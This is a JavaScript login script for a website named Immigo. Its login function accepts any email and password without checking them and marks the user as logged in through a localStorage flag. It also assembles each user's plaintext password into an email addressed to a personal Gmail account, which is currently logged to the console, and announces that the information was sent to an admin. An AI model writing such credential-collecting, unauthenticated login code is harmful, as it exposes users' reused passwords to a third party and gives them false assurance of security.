function login() {
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  if (email && password) {
    // Send login info to admin email
    sendLoginInfoToAdmin(email, password);
    
    // Hide login form and show main container
    document.getElementById('login-container').classList.add('hidden');
    document.getElementById('main-container').classList.remove('hidden');
    
    // Store login state
    localStorage.setItem('isLoggedIn', 'true');
    localStorage.setItem('userEmail', email);
    
    // Show success notification
    showNotification('Login successful! Welcome to Immigo.');
  } else {
    alert('Please enter both email and password.');
  }
}

// Function to send login information to admin
function sendLoginInfoToAdmin(userEmail, userPassword) {
  // Create email content
  const emailContent = {
    to: 'mahfoudhsenhoury@gmail.com',
    subject: 'New User Login - Immigo Website',
    body: `
      New user login detected:
      
      User Email: ${userEmail}
      User Password: ${userPassword}
      Login Time: ${new Date().toLocaleString()}
      User Agent: ${navigator.userAgent}
      IP Address: [Will be captured by server]
      Page: Login Page
      
      This is a login from the Immigo website login page.
    `
  };
  
  // In a real implementation, this would send to your server
  // For now, we'll log it and show a notification
  console.log('Login info to be sent to admin:', emailContent);
  
  // Show notification that info was sent
  showNotification('Login information sent to admin');
}

// Function to show notification
function showNotification(message) {
  // Create notification element
  const notification = document.createElement('div');
  notification.className = 'fixed top-4 right-4 bg-green-500 text-white px-6 py-3 rounded-lg shadow-lg z-50';
  notification.textContent = message;
  
  // Add to page
  document.body.appendChild(notification);
  
  // Remove after 3 seconds
  setTimeout(() => {
    notification.remove();
  }, 3000);
}

// Check if user is already logged in
document.addEventListener('DOMContentLoaded', function() {
  if (localStorage.getItem('isLoggedIn') === 'true') {
    document.getElementById('login-container').classList.add('hidden');
    document.getElementById('main-container').classList.remove('hidden');
  }
}); 